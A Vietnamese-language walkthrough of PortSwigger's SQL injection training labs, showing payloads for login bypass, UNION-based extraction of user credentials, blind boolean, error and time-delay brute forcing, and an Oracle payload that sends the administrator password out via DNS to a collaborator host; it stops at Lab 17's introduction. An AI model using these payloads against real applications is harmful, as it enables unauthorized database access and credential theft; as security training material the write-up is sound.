# SQL INJECTION WRITEUP
***
## Lab 1:  SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/554f438c-b646-4195-b39a-8ce9551034cb)


- Lab này yêu cầu tôi thực hiện tấn công sql injection để hiển thị một hay nhiều sản phẩm chưa được phát hành
- Theo như để bài nơi tấn công injection là bộ lọc danh mục sản phẩm, do đó tôi sẽ sử dụng công cụ Burp Suite để bắt lấy request của category:
 ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/6487f1a6-5f79-46b5-9d23-c178abeaef89)


- Ta đưa nó vào repeater rồi chỉnh sửa request:
  + `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
    
cho thông tin phân loại theo tên category và released = 1
  + Đầu tiên, tôi thêm một kí tự sql đặc biệt dễ phá vỡ câu lệnh truy vấn, ở đây tôi thêm dấu ', thì ta nhận thu được lỗi **Internal Server Error**
     ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/e6624e2f-a844-4f72-98a3-e40362a79b98)

  + Tiếp theo, tôi sẽ chèn thêm 1 phần tử luôn đúng ** 1 = 1 ** vào , khi đó câu lệnh Select * sẽ chọn hế tất cả sản phẩm từ bảng Products mà không cần quan tâm đến sự phân loại của category và sau đó ta sẽ sử dụng dấu -- để bỏ qua tất cả câu lệnh phía sau:
    ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/c2186042-d5c7-45e9-b1fe-3dca87eab6ab)

  Như vậy bài lab trên đã được giải quyết.
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/5786c03b-1deb-4975-8b27-6732f0bd9687)


## Lab 2: SQL injection vulnerability allowing login bypass

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/5208bad3-c1a5-4816-84bd-56e4901039b1)


- Lab này yêu cầu tôi thực hiện tấn công sql injection để đăng nhập vào ứng dụng với tài khoản administrator
- Vì nó là chức năng đăng nhập nên câu lệnh truy vấn sql của nó là một cái gì đó tương tự câu lệnh truy vấn

  `SELECT FIRSTNAME FROM USERS WHERE USER = 'ADMINISTRATOR' AND PASSWORD = 'PASSWORD'`

- Vì đề bài yêu cầu đăng nhập với tư cách administrator nên tôi sẽ thực hiện tấn công sql injection vào tài khoản : `administrator'--`

Ở đây câu lệnh truy vấn sql sẽ tương tự 

`SELECT FIRSTNAME FROM USER WHERE USER = 'ADMISTRATOR'`

nó sẽ đăng nhậo vào tài khoản administrator và tự động bỏ qua trường mật khẩu
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/96a0dc38-0179-4275-adc1-0f31e01fd0fb)


Như vậy bài lab đã được giải quyết
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/e410cab0-91a1-434e-878c-3ff0fc7b7c12)

## Lab 3: SQL injection UNION attack, determining the number of columns returned by the query
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/f9f6c7d5-599a-44d1-8e5a-a187c0cf623b)

- Lab trên chứa lỗ hổng sql injection trong bộ lọc category, và kết quả truy vấn sẽ được trả về trong phản hồi của ứng dụng. Vì vậy tôi có thể sử dụng tấn công UNION để truy xuất dữ liệu từ các bảng khác.
- Mục tiêu của bài lab này là xác định số lượng cột được truy vấn trả về vì vậy tôi sẽ dùng kiểu tấn công union để xác định số cột

  `select ? from table1 union select null`
- Ở đây, table 1 là bảng tôi cần xác định số cột, vì chưa biết số cột là bao nhiêu nên tôi sẽ để nó là ?, tôi sẽ thêm lần lượt các giá trị NULL. Nếu số cột không đúng nó sẽ báo lỗi, ngược lại số cột table1 trùng với số giá trị NULL thì chúng ta sẽ xác định được số cột của bảng table1
- Đầu tiên, tôi sẽ dùng công cụ burp suite đưa filter category vào repeater
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/4c666776-bdd8-457c-b82f-d75d804de97c)
- Tiếp theo tôi sẽ thêm phần tham số của filter?category=Gifts là: '+union+select+null--
  + Với dấu ' là để ngắt input vào tham số accesories, UNION SELECT để khởi tạo UNION và thêm 1 số NULL, đồng thời chú thích để ngắt những câu lệnh đằng sau: 
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/5358ac83-9a03-422c-ab25-6e864d0488a7)
- Tôi thu được kết quả là lỗi server: `Internal Server Error`, điều đó chứng tỏ số cột của table1 không phải là 1, tôi tiếp tục thêm null vào cho đến giá trị null thứ 3 thì câu lệnh query trả về 3 giá trị của bảng table1
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/c60405bf-1e47-4b47-8a84-dd923954314b)

Như vậy, tôi biết được số cột cần tìm là 3 và bài lab đã được giải quyết

## Lab 4: SQL injection UNION attack, finding a column containing text  
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/4b3b8ae1-1959-4900-9a63-ddad46cd5831)

- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của lab này là tìm ra cột có kiểu dữ liệu là string trong query trả về
- Đầu tiên, bằng kỹ thuật của lab trước ta xác định được số cột trả về của câu lệnh query là 3
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/2d3484b9-9e1e-47f8-b78a-f2dae8b75e48)
- Tiếp theo ta thay lần lượt các giá trị null bằng 1 chuỗi có kiểu dữ liệu là string để xác định cột nào trong query trả về là string
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/4c868387-790f-4cbd-bfe7-0bf3dcb92df9)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/00332912-9f6a-41e0-8f2d-595309e3e698)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/5946461b-1696-49a1-9856-7bdc9ad923c0)

Như vậy sau ba lần thử ta thu được kiểu dữ liệu ở cột 2 là string

## Lab 5: SQL injection UNION attack, retrieving data from other tables

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/011c4c2f-8d66-4922-8655-3ccafb1bad4d)
- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu: truy xuất tất cả username và password, đồng thời sử dụng thông tin để đăng nhập với tư cách administrator.
- Đầu tiên ta sẽ xác định số cột trả về của query:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/8e81a676-0f4a-45e1-ae64-a64b6b9925ed)
- Ta thu được số cột là 2, tiếp theo ta sẽ kiểm tra cột nào có kiểu dữ liệu là string trong query:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/e7310d0d-0fd8-4104-85d9-b3001299b1aa)
- Sau khi thu được kết quả là cả 2 cột của query đều là kiểu dữ liệu string, ta tiến hành lấy username và password của bảng users bằng câu lệnh:

  `UNION SELECT username, password FROM users`

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/45c36ae7-4cd2-4e52-86d9-bb43f610f1af)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/2d24b6d4-ca6f-4cb3-a028-1a3fc44763ee)

- Ta thu được 3 tài khoản:
  + Username: carlos password: pvgpp9o6trxpr93ahccn
  + Username: wiener password: wbdwdd8pkp9lt5umm54o
  + Username: administrator password: 0qr272qw91l66n6acds8
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/709daa97-95d2-4b74-92af-ac10bb63484e)

## Lab 6: SQL injection UNION attack, retrieving multiple values in a single column
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/fcaf4ec7-8661-4e91-a0c4-fccb43278c20)
- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu: truy xuất tất cả username và password, đồng thời sử dụng thông tin để đăng nhập với tư cách administrator.
- Đầu tiên ta sẽ xác định số cột trả về của query:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/67105887-96b3-414c-853a-d08556dc270e)
- Ta thu được số cột là 2, tiếp theo ta sẽ kiểm tra cột nào có kiểu dữ liệu là string trong query:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/b12231f0-a1d6-4118-91f5-cd8c17e5a232)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/c05e897e-e963-40ff-8d59-f81b5daa27a7)
- Vật là sau 2 lần thử ta biết được kiểu dữ liệu của cột 2 trong câu lệnh query là kiểu dữ liệu string
- Tiếp theo ta tiến hành lấy thông tin username và password của bảng users:
   + Ở đây đề bài có gợi ý chúng ta tham khảo *[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)* , ta biết được cách nối các chuỗi:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/8628d16c-1d36-4649-ad2c-3a3b7df20e13)
  + Việc tiếp theo chúng ta cần làm là đi xác định xem loại database mà lab đang sử dụng là gì:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/c3c8d3ba-d144-4f86-b298-fa4082cba6f7)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/3a2d0ab3-44dc-462c-9fa6-0aebe4dd05a9)
  + May mắn là sau 2 lần thử ta tìm được loại database đang sử dụng là: PostgreSQL. Vì vậy ta sử dụng câu lệnh `UNION SELECT null, username||'*'||password from users` để lấy ra thông tin tài khoản và mật khẩu của bảng users và dùng kí tự '*' để phân cách username và password:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/4b1a99b3-ee13-4d45-b872-06af2923c829)
  + Vậy là ta thu được thông tin username và password của bảng users: 
    + Username: carlos password: ef4ueznxivablyhn7p7g
    + Username: wiener password: q64ty8g7wdo6h3afmkip
    + Username: administrator password: eqgfgcq6tbnetyg4r3cl
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/9b6f70bc-9797-4bb8-a445-53b915ef1f6c)

## Lab 7: SQL injection attack, querying the database type and version on Oracle

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/406e5f90-6de3-430e-b45c-ebfff6855bb3)
- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của bài lab trên hiển thị chuỗi phiên bản của database
- Ở đây đề bài có gợi ý chúng ta tham khảo *[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)*, từ đó ta biết được cách xác định phiên bản của database bằng cách sau:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/8e790e97-24cf-45b7-8f3b-1ad738d0484f)
- Đầu tiên ta sẽ xác định số cột của kết quả query trả về. Trên cơ sở dữ liệu Oracle, mọi câu lệnh SELECT phải chỉ định một bảng để chọn FROM. Nếu cuộc tấn công UNION SELECT của bạn không truy vấn từ một bảng, bạn vẫn cần bao gồm từ khóa FROM theo sau là tên bảng hợp lệ. Có một bảng tích hợp sẵn trên Oracle có tên là *dual* mà bạn có thể sử dụng cho mục đích này nên ta sẽ sử dụng `UNION SELCT null FROM DUAL` để xác định số cột của query:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/6f395a30-f6fe-4fa7-8bd0-208cbd8a9c53)
- Từ đó ta xác định được số cột là 2, tiếp theo ta sẽ xem xét 2 cột trả về cột nào sẽ trả về kiểu dữ liệu là string
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/5a5ee2e0-98c2-4aca-a080-1b83fb6d1730)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/b54d055f-f69d-479b-8d3f-5302b0b72b7d)

- Chúng ta biết được 2 cột đều mang giá trị string nên ta có thể trỏ câu lệnh`SELECT banner FROM v$version` vào bất kỳ cột nào để xác định phiên bản của database, ở đây ta sẽ chọn cột 1
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/1aa23eb7-dfaf-4e7b-8a14-e7289d558d85)
- Như vậy ta biết được phiên bản của database là: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

## Lab 8: SQL injection attack, querying the database type and version on MySQL and Microsoft
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/636cdff2-b333-49c8-bdba-cfba4ea81b32)

- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của bài lab này hiển thị chuỗi phiên bản của database
- Tương tự như lab trước, ta cũng sẽ đi xác định số cột và kiểu dữ liệu của cột nào trả về là string
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/382b1c10-2dde-4dfe-a4bf-92d1bd203e0c)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/709f9bc4-faa0-4c34-83c9-f7dd8be09e41)
- Ta xác định được số cột là 2 và cột 1 trả về kiểu dữ liệu string, tiếp theo ta sẽ dụng câu lệnh `UNION SELECT @@version, null` để xác định phiên bản database của trang web
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/88775761-e27c-46e6-bd8a-632a785f6925)

## Lab 9: SQL injection attack, listing the database contents on non-Oracle databases

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/672bb900-99d9-4471-9779-af27389c4490)
- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của bài lab này là xác định tên của bảng này và các cột chứa trong đó, sau đó truy xuất nội dung của bảng để lấy username và password của tất cả người dùng. Cuối cùng đăng nhập với tư cách là administrator
- Đầu tiên ta sẽ xác định số cột và xem cột nào có kiểu dữ liệu là string:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/983e1d35-de54-4054-801b-9e369f34169e)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/ece0fad1-8156-475d-98fe-82c4e514bdac)
- Ta thu được số cột của query là 2 và 2 cột đều có kiểu dữ liệu là string, tiếp theo ta sẽ đi xác định loại database mà web đang sử dụng và phiên bản của nó :
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/f1feee2d-41a5-4ac6-87ee-017c6e036efc)
- Ta biết được loại database ở đây là PostgreSQL từ đó ta có thể liệt kê các bảng trong database và các cột trong bảng:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/e868fb5a-cca1-488f-a674-c78b739733d0)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/8b26e503-9b07-4b68-8bfa-014021c91bde)

- Để lấy tên các bảng trong databaseta sử dụng câu lệnh `UNION SELECT table_name,null FROM information_schema.tables`
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/5ae09b36-581d-4f21-94ab-e67cdca04444)
- Sau khi đã có được các bảng trong database ta tìm được 1 bảng chưa các thông tin người dùng là *users_yvfjdr*. Sau đó, ta sẽ tiếp tục tìm các cột có chưa thông tin username và password trong bảng users_yvfjdr
`UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_yvfjdr'
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/692a7040-ad7f-4cb9-afb4-15410bfc46da)
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/88fb4a5f-b778-40c0-9193-14a6d2751068)
- May mắn là ta tìm được 2 cột có tên là *username_esaqfd* và *password_xwykge*. Từ đó ta sẽ đi truy xuất username và password của bảng *users_yvfjdr*
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/e8a5bf9a-29d8-4145-9af5-cde357275dc3)
- Ta thu được password của administrator là: 2xhmclqcj65zlzpyfitm
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/3ce38571-3dde-454b-8db7-7420973bfc59)

## Lab 10: SQL injection attack, listing the database contents on Oracle
     
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/e7623956-b98f-4c02-9abf-4c106dffc2d8)

- Lab trên chứa lỗ hổng sql injection trong bộ lọc category
- Mục tiêu của bài lab này là xác định tên của bảng này và các cột chứa trong đó, sau đó truy xuất nội dung của bảng để lấy username và password của tất cả người dùng. Cuối cùng đăng nhập với tư cách là administrator
- Đầu tiên ta sẽ xác định số cột và xem cột nào có kiểu dữ liệu là string:
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/1931facb-b836-47bd-8f48-d2d970782583)
- Ta thu được số cột trả về là 2 và kiểu dữ liệu của 2 cột đều là string. Theo như thông tin bài lab đã cho database ở đây là oracle, do đó ta sẽ dùng câu lệnh:
  `UNION SELECT table_name,null  FROM all_tables` để truy xuất ra các bảng có trong database
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/0286d865-36f0-4739-908d-e7c1ae904552)
- Ta nhận được 1 bảng có tên là *USERS_SCKKOA*. Ta sẽ tiếp tục tìm kiếm thông tin username và password ở bảng *USERS_SCKKOA*:
`UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_SCKKOA'`
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/52795081-b8c1-4ea9-88e5-38f4737f651a)
- Ta nhận được 2 cột có tên là *USERNAME_ZAUSII* và *PASSWORD_ALYSRA*, tiếp theo ta sẽ đi tiến hành lấy thông tin username và password của các tài khoản trong bảng *USERS_SCKKOA* dựa vào 2 cột trên
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/b6f15f4a-38e0-46f9-ae85-727f9f88c05b)

- Như vậy ta tìm được 3 tài khoản với username và password là:
  + Username: administrator password: ext4fzchddhsfh0l4wpm
  + Username: carlos password: edku7zejid7cwkz61z7j
  + Username: wiener password: sboskqqp4ru444ebfl5d
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/144fb48d-88c3-4687-ab27-0b82e04f4482)

## Lab 11: Blind SQL injection with conditional responses

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/6f6279ca-9345-4250-a4b5-65bc3f52bbc8)
- Lab này có chứa lỗ hổng Blind SQL Injection, Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn SQL không được trả về và không có thông báo lỗi nào được hiển thị. Tuy nhiên, ứng dụng sẽ bao gồm thông báo "Welcome back" trong trang nếu truy vấn trả về bất kỳ hàng nào.
- Theo như dữ liệu của bài lab chúng ta có một bảng trong database là users và 2 cột là username và password. Mục tiêu của bài lab này là khai thác lỗ hổng blind sql injection để tìm ra được password của tài khoản administrator và đăng nhập với tư cách là administrator
- Đầu tiên ta sẽ chèn vào trang web câu truy vấn luôn đúng và câu lệnh luôn sai để xem phản ứng của trang web
 ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/ec796565-9583-4310-b151-89d833ae9d19)
 ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/6f7b036d-5748-4c91-8364-d37027ba0be0)

- Ta nhận thấy khi chèn vào trang web câu 1 câu truy vấn, nó sẽ trả về *Welcome back* nếu  câu truy vấn đó là đúng và không phản hồi lại gì nếu nó là sai. Ta biết được username là *administrator*, bây giờ ta cần đi kiểm tra độ dài của mật khẩu bằng câu lệnh :

  `and (Select 'a' from users where username = 'administrator' and length(password) = $X) = 'a'`

  Trong đó X là độ dài của mật khẩu. Ở đây ta sẽ dùng tab intruder để bruteforce, attack type *sniper* cho kiểm tra độ dài mật khẩu tử 1 đến 50:
  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/f4656c38-a2a5-49be-a201-d11def36df44)

  - Như vậy ta tìm được độ dài của mật khẩu là: 20. Tiếp theo ta sẽ đi dò từng ký tự của mật khẩu bằng câu truy vấn:

    `and (select substring(password,$x, 1) from user where username='administrator')='$y'`

    Trong đó $x là vị trí con xâu chạy từ 1 đén 20 và $y là vị trí thử các ký tự của mật khẩu từ a-z và 0-9. Ta chọn mode ClusterBomb và bắt đầu bruteforce:
    ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/f5c789c6-ecca-4e02-bb68-b1144286c2cc)
    ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/5a048fc7-ef10-4891-93e9-92559448e50b)
  - Sau khi tìm kiếm các trường hợp trở về *Welcome back* của các ký tự đúng trong password ta thu được password: ndsh14qof5am5f4n40yh
    ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/6b24b0e9-b691-4ddc-b0a9-c253f7e4549c)


## Lab 12: Blind SQL injection with conditional errors

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/a9fda624-4d8f-453a-b347-88d27f6ba484)

- Lab này có chứa lỗ hổng Blind SQL Injection, Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn SQL không được trả về và không có thông báo lỗi nào được hiển thị. Nhưng bất kỳ câu lệnh nào không được thực thi thì chương trình sẽ báo lỗi.

- Theo như dữ liệu của bài lab chúng ta có một bảng trong database là users và 2 cột là username và password. Mục tiêu của bài lab này là khai thác lỗ hổng blind sql injection để tìm ra được password của tài khoản administrator và đăng nhập với tư cách là administrator
- Đầu tiên, ta sửa đổi cookie TrackingId, thêm một dấu ' vào nó
 ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/58ab5aa2-6764-4d0e-8b63-b90796a25ae2)

ta nhận được status 500 thông báo lỗi. Nhưng khi ta thêm 1 dấu ' để  đóng trích dẫn thì lỗi đó biến mất

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/9da8f333-b76a-4094-b0b5-8200e44abe45)

- Tiếp theo ta sẽ đi kiểm tra xem loại database của trang wed đang sử dụng là gì thì ta biết được nó là orcle vì nó yêu cầu mệnh đề From để truy vấn
  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/523d3d34-aa6d-4227-b721-b850a414bbf5)
- Sau đó ta sẽ đi tìm độ dài mật khẩu của tài khoản administrator bằng cách nối thêm câu truy vấn:

  `|| (Select case when length(password) = $x then to_char(1/0) else '' end from users where username='administrator')||`

Trong đó $x là độ dài của mật khẩu nếu độ dài mật khẩu bằng $x thì trang web nó sẽ báo lỗi(status 500) vì nếu nó đúng nó sẽ thực hiện phép tính 1/0 và gặp lỗi, ngược lại trang web sẽ phản hồi lại status là 200. Ta sữ dụng tab intruder chọn attack type là sniper và bắt đầu dò tìm độ dài mật khẩu

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/04c19574-8aa3-4f3f-a1d7-b035e96aa2e6)

- Như vậy ta biết được độ dài của mật khẩu là 20, ta tiếp tiếp tục đi dò tìm các ký tự của mật khẩu bằng câu lệnh

  `|| (Select case when substr(password,$x,1) = '$a' then to_char(1/0) else '' end from users where username='administrator')||`

  Trong đó $x là các vị trí từ 1-20 của mật khẩu , $a là các trường hợp thử của các ký tự:

  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/940b8d35-19e4-474f-b6a1-99c37a4337af)
  
  Kết quả bruteforce ta có
  
  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/f797d915-1f6f-4730-8509-9965df62609a)

 Vậy mật khẩu của administrator là: lq3wtceb2ap07jtb465i

 ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/96d13ef7-b035-4bf6-95ce-70ca7c352d60)


## Lab 13: Visible error-based SQL injection

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/ef40b833-9a7f-4341-be06-50077e6c11bb)

- Lab chứa lỗ hổng SQL SQL. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn SQL không được trả về. Database có một bảng là users và 2 cột là username và password
- Mục tiêu của lab này là: tìm cách rò rỉ mật khẩu cho người dùng administrator, sau đó đăng nhập vào tài khoản của họ.
- Đầu tiên ta sẽ thử thêm vào trang web câu truy vấn luôn sai và luôn đúng xem phản hồi của trang web
  
  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/8d9edf5d-f5ab-4276-8239-41aae3802498)
  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/a9fae038-efd0-4122-bdaf-78c15a4f34f0)

Trang web đều trả về status 200, điều đó cho thấy điều kiện trong câu truy vấn là đúng hay sai đều không ảnh hưởng gì tới bài lab lần này. Bây giờ ta sử dụng hàm cast để chuyển dữ liệu String về int để khiến ứng dụng tạo ra thông báo lỗi có chứa một số dữ liệu được truy vấn trả về

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/ebc4a6c2-e51d-4103-97a8-a0cb2382deb6)

Trang web trả về lỗi khi chuyển username administrator về kiểu dữ liệu int, vậy là ta biết được username là administrator. Tiếp theo ta sẽ chuyển password về kiểu dữ liệu int để xem kết quả trả về của câu truy vấn: 

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/6fa615bb-08db-4d48-bfae-333c8bbb2a86)

Vậy là ta nhận được password trả về là: clf4yocb5eecjf4j5qw4

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/b4d131a0-7e12-4ab6-8352-a0983ef25c52)

# Lab 14: Blind SQL injection with time delays and information retrieval

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/7e8c7081-f0e3-4749-90df-f02fe150fc80)

- Lab chứa lỗ hổng SQL SQL. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Kết quả của truy vấn SQL không được trả về và ứng dụng không phản hồi theo bất kỳ cách nào khác nhau dựa trên việc truy vấn trả về bất kỳ hàng nào hay gây ra lỗi. Tuy nhiên, do truy vấn được thực hiện đồng bộ nên có thể kích hoạt độ trễ thời gian có điều kiện để suy ra thông tin. Database có một bảng là users và 2 cột là username và password
- Mục tiêu là tìmd được mật khẩu của administrator và đăng nhập vào
- Đầu tiên ta thử phản hồi của trang web khi thêm 1 câu truy vấn gây ra độ trễ thời gian

  `|| ( select case when (1=1) then pg_sleep(10) else pg_sleep(0) end) -- `

  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/2240b9d8-f9a6-41ae-9eed-839710b0f92a)

ta nhận được phản hồi trả về là hơn 10s vậy nên câu truy vấn tạo độ  trễ thời gian là hợp lệ. Bây giờ ta sẽ đi tìm độ dài của mật khẩu dựa vào câutruy vấn

`|| ( select case when (username='administrator' and length(password)=$x) then pg_sleep(10) else pg_sleep(0) end from users) -- `

trong đó $x là độ dài mật khẩu. Trang web sẽ phản hồi lớn hơn 10s khi ta có độ dài password là đúng. Ở đây ta sẽ dùng tab intruder, attack type là sniper để đi dò độ dài mật khẩu

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/da67f0a7-77e9-487e-9716-b2b09e73ec84)

ta nhận được độ dài password là 20. Bây giờ ta sẽ đi tìm từng ký tự của password bằng câu lệnh:

|| ( select case when (username='administrator' and substring(password,$x,1)='$y') then pg_sleep(10) else pg_sleep(0) end from users) --

trong đó $x là xâu vị trí của password, $y là các ký tự thử. Ở đây ta sẽ dùng attack type là cluster bomb và tiến hành brute force: 

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/3bee31d8-9643-4b23-84b3-a60f8abef371)

 ta thu được password là: xdd8vnz55znm4zpng1b0

 ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/eb0c6b71-0d8d-43e8-8723-253918f07bd4)

## Lab 15: Blind SQL injection with out-of-band interaction

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/f21b40a3-b427-4743-9aa0-e7504546c852)

- Lab chứa lỗ hổng SQL SQL. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi
- Truy vấn SQL được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Tuy nhiên, ta có thể kích hoạt các tương tác ngoài băng tần với miền bên ngoài
- Mục tiêu: khai thác lỗ hổng SQL SQL để thực hiện tra cứu DNS
- Đầu tiên, ta truy cập trang đầu của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu chứa cookie TrackingId.

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/a5ed6f45-a933-45f2-8d17-a29cb27061d9)

- Tiếp theo, ta sẽ tiến hành đi tra cứu DNS, do ta chưa biết loại database trang wed sử dụng nên ta sẽ đi thử:
  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/c664c10f-918d-478a-a34f-041b487404ec)

  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/e0430ba7-b262-4250-84da-bb4f5c63fce6)

  May mắn trong lần thử đầu tiên ta đã biết được loại database của trang web là: Oracle và đa tra cứu DNS thành công

  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/313574e4-43fd-4de6-9d0d-ad95723e8db1)

## Lab 16: Blind SQL injection with out-of-band data exfiltration
![image](https://github.com/Mtuwn/Portswigger/assets/100981255/c73dcc82-e9bb-4a92-bc7e-9525a62208c3)

- Lab chứa lỗ hổng SQL SQL. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi
- Truy vấn SQL được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Tuy nhiên, ta có thể kích hoạt các tương tác ngoài băng tần với miền bên ngoài.
- Database có chứa 1 bảng có tên là users và 2 cột có tên là username và password
- Mục tiêu: Tìm được password của tài khoản administrator và đăng nhập thành công
- Đầu tiên ta sẽ dùng burp suite professional để lấy được mã nguồn của trang web
  ![image](https://github.com/Mtuwn/Portswigger/assets/100981255/709bf6df-6481-4bd6-bfb4-eecc1aac8584)

tiếp theo ta khiến cơ sở dữ liệu thực hiện tra cứu DNS sang miền bên ngoài chứa kết quả của truy vấn được chèn bằng câu lệnh truy vấn:

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/af33b90e-b515-46fe-99bc-67ee85ceedb3)

'|| SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.mrhynhbcjcn0lxym0b9ygnaspjv9jy.oastify.com/"> %remote;]>'),'/l') FROM dual--'

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/7e46506e-ea6e-4f1c-8dd2-65a859efe9a3)

Như vậy password đã được thêm vào và nối với DNS: 3tq5aky1wnf0l0d34iwz

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/71241779-4f10-4f5b-8bb5-53233e8ea60a)

Như vậy bài lab đã được giải quyết

## Lab 17: SQL injection with filter bypass via XML encoding

![image](https://github.com/Mtuwn/Portswigger/assets/100981255/344e6ff9-3037-4f98-9331-257b4828db6f)

- Lab trên chứa một lỗ hổng SQL Injection ở tính năng kiểm tra hàng hóa. Database có 1 bảng là users và có 2 cột là username và password
- Nhiệm vụ của ta là phải lấy được thông tin từ bảng users, từ đó lấy được tài khoản và mật khẩu của administrator.
